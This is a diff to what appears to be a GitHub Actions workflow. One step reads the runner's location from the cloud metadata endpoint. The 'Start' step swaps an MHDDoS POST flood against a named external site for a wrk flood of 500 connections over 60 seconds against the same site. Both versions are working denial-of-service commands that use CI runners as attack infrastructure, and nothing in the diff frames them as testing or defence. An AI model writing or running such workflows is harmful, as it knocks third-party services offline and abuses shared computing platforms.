@@ -8,7 +8,5 @@ jobs:
           curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01&format=text"
       - name: Start
         run: |
-          git clone https://github.com/MatrixTM/MHDDoS.git
-          cd MHDDoS
-          pip install -r requirements.txt
-          python start.py POST http://lscf.eu.cc/ 0 1000 all.txt 1000 60 true
+          sudo apt-get install -y wrk
+          wrk -t4 -c500 -d60s http://lscf.eu.cc/
